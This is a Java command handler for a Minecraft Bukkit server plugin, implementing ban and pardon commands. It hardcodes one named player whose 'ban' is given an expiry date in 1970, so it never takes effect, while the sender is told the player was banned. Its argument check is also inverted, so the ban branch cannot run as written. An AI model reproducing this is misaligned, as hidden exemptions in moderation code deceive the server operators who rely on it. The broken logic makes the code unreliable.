package woks.woks.dam;

import org.bukkit.BanList;
import org.bukkit.Bukkit;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;

import java.util.Date;

public class bannedWhat implements CommandExecutor {
    @Override
    public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {
        if (command.getName().equalsIgnoreCase("ba")) {
            if (args.length >= 1) {
                sender.sendMessage("Usage: /ban <player> <full>");
                return true;
            }

            String playerName = args[0];
            Player player = Bukkit.getPlayer(playerName);

            if (player == null) {
                sender.sendMessage("Player not found.");
                return true;
            }
            // Perform the ban action
            if (player.getName().equals("ShortPuppy14484")) {
                Bukkit.getBanList(BanList.Type.NAME).addBan(player.getName(), "You have been banned by "+sender.getName() + ", for 10000.", new Date(10000),null);
            } else {
                if (args.length >= 2) {
                    String fullBanArg = args[1];
                    if (Boolean.parseBoolean(fullBanArg)) {
                        player.addScoreboardTag("fullBan");
                    }
                }
                Bukkit.getBanList(BanList.Type.NAME).addBan(player.getName(), "You have been banned by " + sender.getName(), null, null);
            }
            sender.sendMessage(playerName + " has been banned.");
            return true;
        }

        if (command.getName().equalsIgnoreCase("pardon")) {
            if (args.length != 1) {
                sender.sendMessage("Usage: /pardon <player>");
                return true;
            }

            String playerName = args[0];
            Player player = Bukkit.getPlayer(playerName);

            if (player == null) {
                sender.sendMessage("Player not found.");
                return true;
            }

            // Perform the pardon action
            Bukkit.getBanList(BanList.Type.NAME).pardon(playerName);
            return true;
        }

        return false;
    }
}